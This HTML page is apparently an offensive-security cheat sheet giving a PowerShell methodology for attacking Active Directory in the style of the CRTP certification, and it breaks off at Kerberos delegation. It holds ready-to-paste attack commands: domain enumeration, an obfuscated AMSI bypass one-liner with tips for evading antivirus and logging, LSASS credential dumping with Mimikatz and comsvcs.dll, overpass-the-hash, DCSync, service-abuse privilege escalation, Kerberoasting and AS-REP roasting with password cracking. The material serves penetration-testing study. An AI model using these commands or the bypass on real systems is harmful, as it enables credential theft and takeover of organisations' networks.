<!DOCTYPE html>
<html lang="en-US">
<head>
<link rel="icon" type="image/x-icon" href="/machete/conf/LOGO01.png">
<link rel="stylesheet" type="text/css" href="/machete/conf/machete_style_offensive_sections.css">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script src="/machete/conf/machete_conf.js"></script>
	
  <title> M A C H E T E </title>
  <!--------------------->
  <!-- b0ydC Founder -->
  <!-- --------------- -->
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta charset="utf-8" />

</head>
<body>
<br>
<a href="/machete/index.html"><img src="/machete/conf/letter_logo.jpg" alt="LOGO" style="width:20%;"></a>
<br>
<center>
<div style="font-size:24px; text-align:center; font-family:courier,monospace;">
    <a href="/machete/offensive.html">OFFENSIVE</a> |
    <a href="/machete/defensive.html">DEFENSIVE</a> |
    <a href="/machete/tools.html">WIKI</a> |
    <a href="/machete/about.html">ABOUT</a> 
</div> 

<p class="titulos"><mark>[CRTP METHODOLODY USING POWERSHELL]</mark></p>
<div>
<pre>
<div class="column" style="display: inline-block; text-align: left; background-color:gray;">
<button onclick="document.location='/machete/offensive/penetration_testing/AD_attacks.html'" class="round" style="float: left;">&lt;&lt;</button><br><br>

<h4>POWERSHELL ENUMERATION</h4>
<details>
<summary>DOMAIN ENUMERATION</summary>

<b>ACTIVE DIRECTORY POWERSHELL MODULE</b> | <a href="https://github.com/samratashok/ADModule">ADModule</a> 

<b>BLOODHOUND</b> | <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> 

>> avoid detections like ATA (using sharphound collector to create the .zip file with the relationships associated)

<b>C1: PS> </b><mark id="CRTP01">Invoke-BloodHound -CollectionMethod All -ExcludeDC</mark><br>
<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP01')">.C1.</button> 
	
<b>POWERVIEW</b> | <a href="https://github.com/ZeroDayLab/PowerSploit/blob/master/Recon/PowerView.ps1">PowerView</a>

<b>SHARPVIEW</b> | <a href="https://github.com/tevora-threat/SharpView/">SharpView</a>

<b><u>:::GET CURRENT DOMAIN</u></b>

<b>C1: PS> </b><mark id="CRTP02">Get-Domain</mark> | (powerview)
<b>C2: PS> </b><mark id="CRTP03">Get-ADDomain</mark> | (active directory module)<br>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP02')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP03')">.C2.</button> 

<b><u>:::GET OBJECT OF ANOTHER DOMAIN</u></b>

<b>C1: PS> </b><mark id="CRTP04">Get-Domain -Domain <domain></mark>
<b>C2: PS> </b><mark id="CRTP05">Get-ADDomain -Identity <domain></mark><br>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP04')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP05')">.C2.</button> 

<b><u>:::GET DOMAIN SID FOR THE CURRENT DOMAIN</u></b>

<b>C1: PS> </b><mark id="CRTP06">Get-DomainSID</mark>
<b>C2: PS> </b><mark id="CRTP07">(Get-ADDomain).DomainSID</mark><br>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP06')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP07')">.C2.</button> 

<b>:::<u>GET DOMAIN POLICY FOR CURRENT DOMAIN</u></b>

<b>C1: PS> </b><mark id="CRTP08">Get-DomainPolicyData</mark>
<b>C2: PS> </b><mark id="CRTP09">Get-DomainPolicy</mark>
<b>C3: PS> </b><mark id="CRTP10">(Get-DomainPolicyData).systemaccess</mark><br>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP08')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP09')">.C2.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP10')">.C3.</button> 

<b><u>:::GET DOMAIN POLICY FOR ANOTHER DOMAIN</u></b>

<b>C1: PS> </b><mark id="CRTP11">(Get-DomainPolicyData –domain [domain]).systemaccess</mark><br>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP11')">.C1.</button>

<b><u>:::GET DOMAIN CONTROLLER FOR THE CURRENT DOMAIN</u></b>

<b>C1: PS> </b><mark id="CRTP12">Get-DomainController</mark>
<b>C2: PS> </b><mark id="CRTP13">Get-ADDomainController</mark><br>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP12')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP13')">.C2.</button> 

<b><u>:::GET DOMAIN CONTROLLER FOR ANOTHER DOMAIN</u></b>

<b>C1: PS> </b><mark id="CRTP14">Get-DomainController -Domain [domainName]</mark>
<b>C2: PS> </b><mark id="CRTP15">Get-ADDomainController -DomainName [domainName] -Discover</mark><br>

<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP14')">.C1.</button> | <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#CRTP15')">.C2.</button> 	

</details>		
<details>
<summary>PS BYPASS EXECUTION & AV SIGNATURES</summary>

<b>EXECUTION</b>

PS> powershell -ExecutionPolicy bypass [script.ps1]
PS> powershell -c [script.ps1]

<b>:::INVISI-SHELL</b>

works really well to bypass:

- script block logging
- system wide transcription 

<a href="https://github.com/OmerYa/Invisi-Shell">invisi-shell | bypass security controls</a> 

** required the .dll file and the execution file needed [admin/non-admin]

RunWithPathAsAdmin.bat
RunWithRegistryNonAdmin.bat

<b>:::BYPASS AV SIGNATURES <AMSITrigger></b>

- load script in memory to avoid AMSI bypass
AMSI Trigger to identify the part of the script that is detected !! Repeat the process until it is not detected to avoid detection on execution phase.
<a href="https://github.com/RythmStick/AMSITrigger">AMSITrigger</a> 

quick usage:

PS> AmsiTrigger.exe -i [filePath]

<b>FLAGS:</b>

-i = input file
-u, --url=VALUE
-f, --format=VALUE          

<b>OUTPUT FORMAT:</b>

1 - Only show Triggers
2 - Show Triggers with Line numbers
3 - Show Triggers inline with code
4 - Show AMSI calls (xmas tree mode)

<b>QUCIK STEPS TO BYPASS AV DETECTION WHEN MAKING CHANGES TO THE SCRIPT</b>

1) remove comments

2) modify each use of "DumpCreds"

<b>SAMPLE:</b>

DumpCreds = DC

3) modify the name of the WIN32 API calls detected

4) reverse the strings that are detected.

<b>SAMPLE:</b>

System.AppDomain = "niamoDppA.metsyS"

<b>:::FULL OBFUSCATION</b>

<a href="https://github.com/danielbohannon/Invoke-Obfuscation">Invoke-Obfuscation</a> 

<b>:::AMSI BYPASS</b>

"just copy & paste, it will let you import script without detection."
works really well with Powerview.

S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    
(    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" 
-f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(
( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i')
,'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
</details>
<details>
<summary>DOMAIN ACL ENUMERATION</summary>
<p>DESCRIPTION: </p>
<b> -ACL- </b>

<b>::: ENUMERATE ACL FOR DOMAIN ADMIN GROUP</b>

in case another domain group is needed, just change it...

PS> Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs –Verbose

<b>::: GET ACL ASSOCIATED WITH THE SPECIFIED OBJECT</b>

PS> Get-DomainObjectAcl -SamAccountName [username] -ResolveGUIDs

<b>::: GET ACL ASSOCIATED WITH THE SPECIFIED PREFIX TO BE USED FOR SEARCH</b>

PS> Get-DomainObjectAcl -SearchBase "STRING" -ResolveGUIDs -Verbose

<b>::: ENUMERATE ACLs USING ACTIVEDIRECTORY MODULE</b> *** by ObjectDN

PS> (Get-Acl 'AD:\CN=Administrator,CN-Users,CD=dollarcorp,DC=moneycorp,DC=local').Access

<b>::: SEARCH FOR INTERESTING ACEs</b>

PS> Find-InterestingDomainAcl -ResolveGUIDs

<b>::: FIND INTERESTING ACL ASSOCIATED TO A GROUP</b>

PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "group_name"}

<b>::: GET ACL ASSOCIATED WITH SPECIFIED PATH</b>

PS> Get-PathAcl -Path "\\[domain]\sysvol"

<b>::: SHOW CURRENT ACL FOR A SPECIFIC USER</b>

PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -eq "<username>"}

note: ?{$_. = means find everything
</details>
<details>
<summary>DOMAIN COMPUTER ENUMERATION</summary>
<p>DESCRIPTION: </p>
<h3>DOMAIN COMPUTER ENUMERATION WITH POWERSHELL</h3>

<b>:::GET A LIST OF COMPUTERS IN THE CURRENT DOMAIN</b>

PS> Get-DomainComputer | select Name
PS> Get-DomainComputer -OperatingSystem "*Server 2016*"
PS> Get-DomainComputer -Ping

PS> Get-ADComputer -Filter * | select Name
PS> Get-ADComputer -Filter * -Properties *
PS> Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
PS> Get-ADComputer -Filter * -Properties DNSHostname | %{Test-Connection -Count 1 -ComputerName $_.DNSHostName}
</details>
<details>
<summary>DOMAIN FOREST ENUMERATION</summary>
<p>DESCRIPTION: </p>
<h3> DOMAIN FOREST ENUMERATION WITH POWERSHELL</h3>

<b> -FOREST- </b>

<b>::: GET DETAILS ABOUT THE CURRENT FOREST</b>

PS> Get-Forest
PS> Get-Forest -Forest <root/forest>

PS> Get-ADForest
PS> Get-ADForest - Identity <root/forest>

<b>::: GET ALL DOMAINS IN THE CURRENT FOREST</b>

PS> Get-ForestDomain
PS> Get-ForestDomain -Forest <root/forest>

PS> (Get-ADForest).Domains

<b>::: GET ALL GLOBAL CATALOGS FOR THE CURRENT FOREST</b>

PS> Get-ForestGlobalCatalog
PS> Get-ForestGlobalCatalog -Forest <root/forest>

PS> Get-ADForest | select -ExpandProperty GlobalCatalogs

<b>::: MAP TRUST OF A FOREST </b>

PS> Get-ForestTrust
PS> Get-ForestTrust -Forest [domain]

PS> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
</details>
<details>
<summary>DOMAIN GPO ENUMERATION</summary>
<p>DESCRIPTION: </p>
<h3> DOMAIN GPO ENUMERATION WITH POWERSHELL</h3>

<b> -GPO- </b>

<b>::: GET LIST OF GPO IN CURRENT DOMAIN</b>

PS> Get-DomainGPO
PS> Get-DomainGPO -ComputerIdentity [hostname]

<b>::: GET GPO WHICH USE RESTRICTED GROUPS OR groups.xml FOR INTERESTING USERS</b>

PS> Get-DomainGPOLocalGroup 

<b>::: GET USERS WHICH ARE IN A LOCAL GROUP OF A MACHINE USING GPO</b>

PS> Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity [hostname]

<b>::: GET MACHINES WHERE THE GIVEN USER IS MEMBER OF A SPECIFIC GROUP</b>

PS> Get-DomainGPOUserLocalGroupMapping -Identity [user] -Verbose

<b>::: GET GPO APPLIED ON AN OU. READ GPOname FROM GPLINK ATTRIBUTE FROM Get-NetOU</b>

PS> Get-DomainGPO -Identity "gplink/cn"

<b>SAMPLE: </b>

PS> Get-DomainGPO -Identity {00000000-0000-0000-0000-000000000000}

<b>::: GET GPLINK ATTRIBUTE OF A GPO</b>

PS> (Get-DomainOU -Identity [OU]).gplink
</details>
<details>
<summary>DOMAIN TRUST ENUMERATION</summary>
<p>DESCRIPTION: </p>
<h3> DOMAIN TRUST ENUMERATION WITH POWERSHELL</h3>

<b> -TRUSTS- </b>

- one way trust | users can access resources in one way, reverse is not allowed.
- two way trust | bi-directional access is allowed

TRANSITIVE: can be extended to establish trust relationships with other domains.
NON-TRANSITIVE: cannot be extended to other domains in the forest. can be two-way or one-way.

> parent-child trust
> tree-root trust

--both use two-way transitive trust

> external trust | between two domains in different forest when forest do not have a trust relationship
can be two-way or one-way and it is non-transitive

> forest trust | between root domains, can be one-way or two-way, transitive or non-transitive

Is a relationship between two domains or forests which allows users of one domain or forest to 
access resources in the other domain or forest. 
Trust can be automatic (parent-child, same forest etc.) or established (forest, external). 

TDO / Trusted Domain Objects (represent the trust relation in a domain)

<b>::: GET LIST OF ALL DOMAIN TRUSTS FOR THE CURRENT DOMAIN</b>

PS> Get-DomainTrust
PS> Get-DomainTrust -Domain [domain]

PS> Get-ADTrust
PS> Get-ADTrust -Identity [domain]

<b>::: LIST ALL TRUST CURRENT FOREST</b> AD MODULE

PS> Get-ADForest | %{Get-ADTrust -Filter *}

<b>::: LIST TRUST IN CURRENT DOMAIN</b>

PS> Get-DomainTrust | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

PS> Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)'

<b>::: LIST EXTERNAL TRUST IN CURRENT FOREST</b>

PS> Get-ForestDomain | %{Get-DomainTrust -Domain $_.Name} | ?{$_.TrustAttributes -eq "FILTER_SIDS"}

PS> (Get-ADForest).Domains | %{Get-ADTrust -Filter '(intraForest -ne $True) -and (ForestTransitive -ne $True)' -Server $_}

<b>::: MAP TRUSTS OF A FOREST</b>

PS> Get-ForestTrust
PS> Get-ForestTrust -Forest <root/forest>

PS> Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'

<b>::: MAP TRSUTS OF CURRENT DOMAIN</b>

PS> Get-ADTrust -Filter *

<b>::: MAP TRUSTS OF EXTERNAL TRUST</b>

PS> Get-ADTrust -Filter * -Server [xternalTrust]  
</details>
<details>
<summary>DOMAIN USER ENUMERATION</summary>
<p>DESCRIPTION: </p>
<h3>DOMAIN ENUMERATION WITH POWERSHELL</h3>

<b>:::GET LIST OF USER IN CURRENT DOMAIN</b>

PS> Get-DomainUser
PS> Get-DomainUser -Identity [user]

PS> Get-ADUser -Filter * -Properties *
PS> Get-ADUser -Identity [userName] -Properties *

<b>:::GET LIST OF USERS BY NAME AND ITS COUNT</b>

PS> Get-DomainUser | select samaccountname | measure

<b>:::GET LIST OF A SPECIFIC PROPERTY OF USERS</b>

PS> Get-DomainUser | select -ExpandProperty samaccountname

<b>:::GET LIST OF PROPERTIES OF A USER IN CURRENT DOMAIN</b>

PS> Get-DomainUser -Identity [user] -Properties *
PS> Get-DomainUser -Properties samaccountname,logonCount ||| will help to retrieve and understand the normal activity of users 

PS> Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
PS> Get-ADUser -Filter * -Properties * | select name,logoncount,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}

<b>:::SEARCH FOR A STRING IN A USER'S ATTRIBUTE</b>

PS> Get-DomainUser -LDAPFilter "Description=*STRING*" | select name,Description

PS> Get-ADUser -Filter 'Description -like "*STRING*"' -Properties Description | select name,Description

<b>:::GET ACTIVELY LOGGED USERS ON A COMPUTER (NEED LOCAL ADMIN RIGHTS ON THE TARGET)</b>

PS> Get-NetLoggedon -ComputerName [hostname]

<b>:::GET LOCALLY LOGGED USERS ON A COMPUTER (NEED REMOTE REGISTRY ON THE TARGET - STARTED BY DEFAULT ON SERVER OS)</b>

PS> Get-LoggedonLocal -ComputerName [hostname]

<b>:::GET THE LAST LOGGED USER ON A COMPUTER (NEED ADMIN RIGHTS AND REMOTE REGISTRY ON THE TARGET)</b>

PS> Get-LastLoggedOn -ComputerName [hostname]

<b>::: GET USERS INFO TO CATCH DECOY USERS</b>

PS> Get-DomainUser | select samaccountname,logoncount  
</details>
<details>
<summary>DOMAIN ENUMERATION USERHUNTING</summary>
<p>DESCRIPTION: </p>
<h3> DOMAIN ENUMERATION - USER HUNTING </h3>

<b>::: FIND ALL MACHINES ON THE CURRENT DOMAIN WHERE THE CURRENT USER HAS LOCAL ADMIN ACCESS</b>

PS> Find-LocalAdminAccess –Verbose

- This function queries the DC of the current or provided domain for a list of computers (Get-NetComputer) and then use 
multi-threaded "Invoke -CheckLocalAdminAccess" on each machine.

- This can also be done with the help of remote administration tools like WMI and PowerShell remoting. 
Pretty useful in cases ports (RPC and SMB) used by "Find-LocalAdminAccessare" blocked.

- See "Find-WMILocalAdminAccess.ps1" and "Find-PSRemotingLocalAdminAccess.ps1"

<b>::: FIND COMPUTERS WHERE A DOMAIN ADMIN (OR SPECIFIED USER/GROUP) HAS SESSIONS</b>

PS> Find-DomainUserLocation -Verbose
PS> Find-DomainUserLocation -UserGroupIdentity "[group]"

This function queries the DC of the current or provided domain for members of the given group (Domain Admins by default) using 
"Get-DomainGroupMember", gets a list of computers (Get-DomainComputer) and list sessions and logged on users "(Get-NetSession/Get-NetLoggedon)" 
from each machine.

<b>::: FIND COMPUTERS WHERE A DOMAIN ADMIN SESSION IS AVAILABLE & CURRENT USER HAS ADMIN ACCESS </b>

PS> Find-DomainUserLocation -CheckAccess

<b>::: FIND COMPUTERS (FILE SERVERS AND DISTRIBUTED FILE SERVERS) WHERE A DOMAIN ADMIN SESSION IS AVAILABLE</b>

PS> Find-DomainUserLocation -Stealth  
</details>
<details>
<summary>DOMAIN GROUP MEMBERS ENUMERATION</summary>
<p>DESCRIPTION: </p>
<h3>DOMAIN GROUP/MEMBERS ENUMERATION WITH POWERSHELL</h3>

<b>:::GET ALL GROUPS IN THE CURRENT DOMAIN</b>

PS> Get-DomainGroup | select Name
PS> Get-DomainGroup -Domain <target_domain>

PS> Get-ADGroup -Filter * | select Name
PS> Get-ADGroup -Filter * -Properties *

<b>:::GET ALL GROUPS CONTAINING THE WORD "admin" IN GROUP NAME</b>

PS> Get-DomainGroup *admin*

PS> Get-ADGroup -Filter 'Name -like "*admin*"' | select Name

<b>:::GET ALL MEMBERS OF THE DOMAIN ADMIN GROUP</b>

PS> Get-DomainGroupMember -Identity "Domain Admins" -Recurse

PS> Get-ADGroupMember -Identity "Domain Admins" -Recursive

<b>::: GET THE GROUP MEMBERSHIP FOR A USER</b>

PS> Get-DomainGroup -UserName "<userName>"

PS> Get-ADPrincipalGroupMembership -Identity <userName>

<b>::: LIST ALL LOCAL GROUPS ON A MACHINE (NEED ADMIN RIGHTS ON NON-DC MACHINES)</b>

PS> Get-NetLocalGroup -ComputerName <hostname> -ListGroups

<b>::: GET MEMBERS OF ALL THE LOCAL GROUPS ON A MACHINE (NEED ADMIN RIGHTS ON NON-DC MACHINES)</b>

PS> Get-NetLocalGroup -ComputerName <hostname> -Recurse

<b>::: GET MEMBRERS OF ALL THE LOCAL GROUP "Administrators" ON A MACHINE (NEED ADMIN RIGHTS ON NON-DC MACHINES)</b>

PS> Get-NetLocalGroupMember -ComputerName <hostname> -GroupName Administrators

<b>::: FIND SHARES ON HOSTS IN CURRENT DOMAIN</b>

PS> Invoke-ShareFinder -Verbose

<b>::: FIND SENSITIVE FILES ON COMPUTERS IN THE DOMAIN</b>

PS> Invoke-FileFinder -Verbose

<b>::: GET ALL FILESERVERS OF THE DOMAIN</b>

PS> Get-NetFileServer

<b>::: GET KERBEROS POLICY</b>

PS> (Get-DomainPolicy).KerberosPolicy

<b>::: GET DOMAIN ADMIN_GROUPS OF FOREST</b>

PS> Get-DomainGroup *admin* -domain <forest/root> | select samaccountname
</details>

<h4>POWERSHELL LATERAL MOVEMENT</h4>
<details>
<summary>DOMAIN LATERAL MOVEMENT</summary>
<p>DESCRIPTION: </p>
<h3>LATERAL MOVEMENTS</h3>

:: powershell remoting (PSRemoting)
uses WinRM | ports: 5985 HTTP & 5986 HTTPS | required: "Enable-PSRemoting"

- two types: 1:1 | 1:many

>>> 1:1

PSSession: interactive | runs in a new process (wsmprovhost) | is stateful

PS> New-PSSession
PS> Enter-PSSession

>>> 1:many

non-interactive | fan-out remoting

PS> Invoke-Command  
</details>
<details>
<summary>DOMAIN LATERAL MOVEMENT MIMIKATZ</summary>
<p>DESCRIPTION: </p>
<h3>LATERAL MOVEMENT - MIMIKATZ</h3>

>> invoke-mimikatz

"Invoke-Mimikatz" is a powershell script, using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the
memory. all functions of mimikatz could be used from this script. (script needs rights to dump credentials)

>>> EXTRACTING CREDENTIALS FROM LSASS

<b>::: DUMP CREDENTIALS ON A LOCAL MACHINE USING MIMIKATZ</b>

PS> Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

<b>::: USING SAFETYKATZ (minidump of LSASS and PELoader to run Mimikatz)</b>

PS> SafetyKatz.exe "sekurlsa::ekeys"

<b>::: DUMP CREDENTIALS USING SHARPKATZ (C# port of some of mimikatz functions</b>

PS> SharpKatz.exe --Command ekeys

<b>::: DUMP CREDENTIALS USING DUMPERT (Direct System Calls and API unhooking)</b>

PS> rundll32.exe C:\Dumpert\Outflank-Dumpert.dll, Dump

<b>::: USING PYPYKATZ (mimikatz functionanlity in Python)</b>

PS> pypykatz.exe live lsa

<b>::: USING comsvcs.dll</b>

PS> tasklist /FI "IMAGENAME eq lsass.exe"
rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsass process ID> C:\Users\Public\lsass.dmp full

>>> OVERPASS-THE-HASH (OPTH)

"generate tokens from hashes or keys" - (needs admin rights)

PS> Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:[aes256key] /run:powershell.exe"'

PS> Safetykatz.exe '"sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:[aes256key] /run:cmd.exe" "exit"

NOTE: those will generate a powershell session with logon type 9 (same  as runas /netonly)

NOTE: using Rubeus.exe the following command doesn't need elevation

PS> Rubeus.exe asktgt /user:administrator /rc4:[ntlmhash] /ptt

instead, the following needs rights

PS> Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

>>> DCSync

"extract credentials from the DC without code execution on it"

<b>::: DCSync FEATURE FOR GETTING KRBTGTHASH</b>

NOTE: Domain Admins privileges are required to run DCSync

PS> Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'

PS> SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"  
</details>
<details>
<summary>DOMAIN LATERAL MOVEMENT PSREMOTING</summary>
<p>DESCRIPTION: </p>
<h3>LATERAL MOVEMENT - PS REMOTING</h3>

--POWERSHELL REMOTING--

<b>::: USE BELOW TO EXECUTE COMMANDS OR SCRIPTBLOCKS</b>

PS> Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content [list_of_servers])

<b>::: USE BELOW TO EXECUTE SCRIPTS FROM FILES</b>

PS> Invoke-Command –FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content [list_of_servers])

<b>::: USE BELOW TO EXECUTE LOCALLY LOADED FUNCTION ON THE REMOTE MACHINES</b>

PS> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content [list_of_servers])

<b>::: PASSING ARGUMENTS: only possitional arguments could be passed this way</b>

PS> Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content [list_of_servers]) -ArgumentList

<b>::: USE BELOW TO EXECUTE "stateful" COMMANDS USING (Invoke-Command)</b>

PS> $Sess = NEw-PSSession -Computername [hostname]
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}

--POWERSHELL REMOTING TRADECRAFT--

- supports the system-wide transcripts and deep script block logging

TIP: We can use winrs in place of PSRemoting to evade the logging and still reap the benefit of 5985 allowed between hosts
 
PS> winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname  
</details>

<h4>POWERSHELL PRIVESC</h4>
	
<details>
<summary>DOMAIN LOCAL PRIVESC</summary>
<p>DESCRIPTION: </p>
<h3>DOMAIN PRIVILEGE ESCALATION</h3>

<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">PowerUp</a>

||| LOCAL |||

<b>::: GET SERVICES WITH UNQUOATED PATHS AND A SPACE IN THEIR NAME</b>

PS> Get-ServiceUnquoted -Verbose

<b>::: GET SERVICES WHERE THE CURRENT USER CAN WRITE TO ITS BINARY PATH OR CHANGE ARGUMENTS TO THE BINARY</b>

PS> Get-ModifiableServiceFile -Verbose

<b>::: GET THE SERVICES WHOSE CONFIGURATION CURRENT USER CAN MODIFY</b>

PS> Get-ModifiableService -Verbose

<b>::: ABUSE FUNCTION FOR "Get-ModifiableService" & ADD OUR CURRENT DOMAIN USER TO THE LOCAL ADMINISTRATORS GROUP</b> 

PS> Invoke-ServiceAbuse -Name 'service_name' -UserName 'domain\user'

<b>::: CHECK FOR DIFFERENT OPTIONS REGARDING THE WAYS OF ABUSE FUNCTION ASSOCIATED</b>

PS> help Invoke-ServiceAbuse -Examples

<b>::: RUN ALL CHECKS</b>

PS> Invoke-AllChecks

<b>::: FIND A MACHINE IN THE DOMAIN WHERE THE USER ADDED TO "local admin group" HAS LOCAL ADMIN ACCESS</b>

PS> import module and invoke "Find-PSRemotingLocalAdminAccess"

<b>::: SHOW SECURITY DESCRIPTORS OF A SERVICE </b>

PS> sc.exe sdshow {service_name}
PS> sc.exe sdshow snmptrap

NOTE: when cheking results. if exist a fifth parenthesis and at the end of that exist something similar 
to the following: {;;;WD)} it means "everyone". All the letters that compose every parenthesis means the
different permissons assigned.  
</details>
<details>
<summary>DOMAIN PRIVESC KERBEROAST</summary>
<p>DESCRIPTION: </p>
<h3> PRIVESC - KERBEROAST </h3>

<b>::: FIND USER ACCOUNTS USED AS "SERVICE ACCOUNTS"</b>

- ActiveDirectorymodule

PS> Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName

- PowerView

PS> Get-DomainUser –SPN

<b>::: USE RUBEUS TO LIST Kerberoast STATS </b>

PS> Rubeus.exe kerberoast /stats

<b>::: USE RUBEUS TO REQUEST A TGS</b>

PS> Rubeus.exe kerberoast /user:svcadmin /simple 

NOTE: To avoid detections based on Encryption Downgrade for Kerberos EType(used by likes of ATA -0x17 stands for rc4-hmac), 
look for Kerberoastableaccounts that only support RC4_HMAC

PS> Rubeus.exe kerberoast /stats /rc4opsec

PS> Rubeus.exe kerberoast /user:svcadmin /simple /rc4opsec

<b>::: KERBEROAST ALL POSSIBLE ACCOUNTS</b>

PS> Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt

<b>::: CRACK TICKET USING JOHN THE RIPPER</b>

PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt  
</details>
<details>
<summary>DOMAIN PRIVESC KERBEROAST ASREPs</summary>
<p>DESCRIPTION: </p>
<h3> PRIVESC - KERBEROAST AS-REPs </h3>

If a user's UserAccountControl settings have "Do not require Kerberos preauthentication" enabled i.e. 
Kerberos preauth is disabled, it is possible to grab user's crackable AS-REP and brute-force it offline.

With sufficient rights (GenericWrite or GenericAll), Kerberos preauth can be forced disabled as well.

<b>::: Enumerating accounts with Kerberos Preauthdisabled</b>

- Using PowerView

PS> Get-DomainUser -PreauthNotRequired -Verbose

- Using ActiveDirectorymodule

PS> Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth

Force disable Kerberos Preauth:

<b> ENUMERATE THE PERMISSIONS FOR RDPUsers ON ACLs USING PowerView</b>

PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

PS> Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose

PS> Get-DomainUser -PreauthNotRequired -Verbose

Request encrypted AS-REP for offline brute-force

Let's use ASREPRoast

PS> Get-ASREPHash -UserName VPN1user -Verbose

To enumerate all users with Kerberos preauthdisabled and request a hash

PS> Invoke-ASREPRoast -Verbose

We can use John The Ripper to brute-force the hashes offline

PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\asrephashes.txt  
</details>
<details>
<summary>DOMAIN PRIVESC KERBEROAST SetPN</summary>
<p>DESCRIPTION: </p>
<h3> PRIVESC - KERBEROAST | Set-SPN </h3>

- With enough rights (GenericAll/GenericWrite), a target user's SPN can be set to anything (unique in the domain).
- We can then request a TGS without special privileges. The TGS can then be "Kerberoasted".

<b>::: ENUMERATE THE PERMISSIONS FOR RDPUsers ON ACLs USING PowerView(dev)</b>

PS> Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}

<b>::: USING Powerview(dev), SEE IF THE USER ALREADY HAS A SPN</b>

PS> Get-DomainUser -Identity supportuser | select serviceprincipalname

<b>::: USING ActiveDirectory MODULE</b>

PS> Get-ADUser -Identity supportuser -Properties ServicePrincipalName | select ServicePrincipalName

<b>::: SET A SPN FOR THE USER (must be unique for the domain)</b>

PS> Set-DomainObject -Identity support1user -Set @{serviceprincipalname='ops/whatever1'}

<b>::: USING ActiveDirectory MODULE</b>

PS> Set-ADUser -Identity support1user -ServicePrincipalNames@{Add='ops/whatever1'}

<b>::: KERBEROAST THE USER</b>

PS> Rubeus.exe kerberoast /outfile:targetedhashes.txt 
PS> john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\targetedhashes.txt  
</details>
<details>
<summary>DOMAIN PRIVESC KERBEROS DELEGATION</summary>
<p>DESCRIPTION: </p>
<h3> PRIVESC - KERBEROS DELEGATION </h3>

allows to "reuse the end-user credentials to access resources hosted on a different server"

